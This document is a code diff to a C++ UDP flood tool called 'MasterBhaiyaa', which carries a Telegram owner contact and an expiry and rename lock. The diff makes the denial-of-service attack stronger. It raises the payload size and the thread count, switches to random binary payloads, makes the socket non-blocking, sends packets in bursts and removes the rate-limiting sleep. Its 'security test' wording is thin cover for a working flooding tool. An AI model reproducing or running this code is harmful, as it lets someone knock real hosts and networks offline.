@@ -10,11 +10,13 @@
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <unistd.h>
+#include <fcntl.h>
 
-#define DEFAULT_PAYLOAD_SIZE 33
-#define FIXED_THREAD_COUNT 460
-#define BINARY_NAME "MasterBhaiyaa"
+#define DEFAULT_PAYLOAD_SIZE 3372   // Increased default payload size
+#define FIXED_THREAD_COUNT 490      // High thread count for stronger attack
+#define BINARY_NAME "MasterBhaiyaa" // Must be named correctly
 
+// Expiration Date
 constexpr int EXPIRATION_YEAR = 2054;
 constexpr int EXPIRATION_MONTH = 11;
 constexpr int EXPIRATION_DAY = 1;
@@ -28,19 +30,17 @@ struct AttackConfig {
     int payload_size;
 };
 
-// Signal handler
+// Signal handler for stopping
 void handle_signal(int signal) {
     std::cout << "\n[!] Interrupt received. Stopping security test...\n";
     stop_flag = true;
 }
 
-// Generate random payload
-void generate_payload(std::string &buffer, size_t size) {
-    static const char charset[] =
-        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()";
+// Generate strong random binary payload
+void generate_payload(std::vector<uint8_t> &buffer, size_t size) {
     buffer.resize(size);
     for (size_t i = 0; i < size; i++) {
-        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
+        buffer[i] = static_cast<uint8_t>(rand() % 256); // Full byte range (0-255)
     }
 }
 
@@ -56,19 +56,19 @@ void check_expiration() {
         std::cerr << "╔════════════════════════════════════════╗\n";
         std::cerr << "║           BINARY EXPIRED!              ║\n";
         std::cerr << "║    Please contact the owner at:        ║\n";
-        std::cerr << "║    Telegram: @Team_Pro_Player         ║\n";
+        std::cerr << "║    Telegram: @Team_Pro_Player          ║\n";
         std::cerr << "╚════════════════════════════════════════╝\n";
         exit(EXIT_FAILURE);
     }
 }
 
-// Check binary name
+// Check if the binary has been renamed
 void check_binary_name() {
     char exe_path[1024];
     ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
     
     if (len != -1) {
-        exe_path[len] = '\0';
+        exe_path[len] = '\0'; // Null-terminate the string
         std::string exe_name = std::string(exe_path);
         size_t pos = exe_name.find_last_of("/");
 
@@ -92,7 +92,7 @@ bool is_valid_ip(const std::string &ip) {
     return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
 }
 
-// UDP attack function with optimized packet sending
+// UDP packet sending function (Optimized)
 void udp_attack(const AttackConfig &config) {
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
@@ -100,35 +100,28 @@ void udp_attack(const AttackConfig &config) {
         return;
     }
 
+    // Set non-blocking mode
+    fcntl(sock, F_SETFL, O_NONBLOCK);
+
     sockaddr_in target_addr = {};
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(config.port);
     target_addr.sin_addr.s_addr = inet_addr(config.ip.c_str());
 
-    std::string payload;
+    std::vector<uint8_t> payload;
     generate_payload(payload, config.payload_size);
 
     auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);
     
     while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
-        // Generate new payload each time for randomness
-        generate_payload(payload, config.payload_size);
-        
-        // Randomized source port
-        sockaddr_in source_addr = {};
-        source_addr.sin_family = AF_INET;
-        source_addr.sin_port = htons(rand() % 65535);
-        bind(sock, (struct sockaddr *)&source_addr, sizeof(source_addr));
-
-        ssize_t sent = sendto(sock, payload.c_str(), payload.size(), 0, 
-                              (struct sockaddr *)&target_addr, sizeof(target_addr));
-        if (sent < 0) {
-            perror("Send failed");
-            break;
+        for (int i = 0; i < 10; i++) { // Send multiple packets per loop
+            ssize_t sent = sendto(sock, payload.data(), payload.size(), 0, 
+                                  (struct sockaddr *)&target_addr, sizeof(target_addr));
+            if (sent < 0) {
+                perror("Send failed");
+                break;
+            }
         }
-
-        // Dynamic pacing to balance attack intensity
-        std::this_thread::sleep_for(std::chrono::milliseconds(10 + (rand() % 5)));
     }
 
     close(sock);
@@ -136,8 +129,10 @@ void udp_attack(const AttackConfig &config) {
 
 // Main function
 int main(int argc, char *argv[]) {
+    // Ensure the binary has not been renamed
     check_binary_name();
 
+    // Print Program Header
     std::cout << "╔════════════════════════════════════════╗\n";
     std::cout << "║          MasterBhaiyaa PROGRAM         ║\n";
     std::cout << "║         Copyright (c) 2024             ║\n";
